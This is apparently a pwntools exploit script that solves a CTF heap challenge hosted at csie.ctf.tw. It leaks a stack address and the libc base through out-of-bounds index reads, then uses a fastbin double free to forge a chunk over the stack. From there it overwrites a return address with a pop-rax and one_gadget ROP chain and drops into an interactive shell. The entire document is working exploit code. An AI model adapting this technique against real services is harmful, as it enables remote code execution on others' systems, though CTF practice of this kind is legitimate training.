from pwn import *

context.arch = 'amd64'

###Utils
def new(sz,data):
    r.sendlineafter('> ','1')
    r.sendlineafter('size: ',str(sz))
    r.sendafter('content: ',data)

def prnt(idx):
    r.sendlineafter('> ','2')
    r.sendlineafter('index: ',idx)
    return r.recvline()[:-1]

def rmv(idx):
    r.sendlineafter('> ','3')
    r.sendlineafter('index: ',str(idx))

def exp_rmv(readdata,idx):
    r.sendlineafter('> ',readdata)
    r.sendlineafter('index: ',str(idx))

def ext():
    r.sendlineafter('> ','4')




r = remote('csie.ctf.tw',10135)

###Useful Address
rsp = 0 #note-6 -> note22
start_main_addr = 0 #note23 - 240
start_main_offset = 0x20740
block1_addr = 0 #note0 -> block1

###ROPchain
sys_pop_rax = 0x33544     #pop rax ; ret
sys_one_gadget = 0x45216  #constraint : rax=NULL

###Leak rsp(malloc table addr)
rsp = u64(prnt('-6').ljust(8,b'\x00'))-22*8

###Leak libc_base
start_main_addr = u64(prnt(b'-25'.ljust(8,b' ')+p64(rsp+8*23)).ljust(8,b'\x00'))-240
libc_base = start_main_addr-start_main_offset

###Leak first malloc_block_addr
new(0x58,'a')
block1_addr = u64(prnt(b'-25'.ljust(8,b' ')+p64(rsp)).ljust(8,b'\x00'))

###Perform double free
new(0x58,'b')
exp_rmv(b'3'.ljust(8,b' ')+p64(block1_addr)+p64(0)+p64(0x61),-23)
rmv(1)
rmv(0)

###Forge block at desired position + hijack read return addr
new(0x58,p64(rsp-13*8))
new(0x58,b'b')
new(0x58,b'c')
r.sendlineafter('> ',b'1'.ljust(8*12,b' ')+p64(0x61))
r.sendafter('size: ','88')
r.sendafter('content: ',b'\x00'*16+p64(libc_base+sys_pop_rax)+p64(0)+p64(libc_base+sys_one_gadget))

###Enter shell
r.interactive()


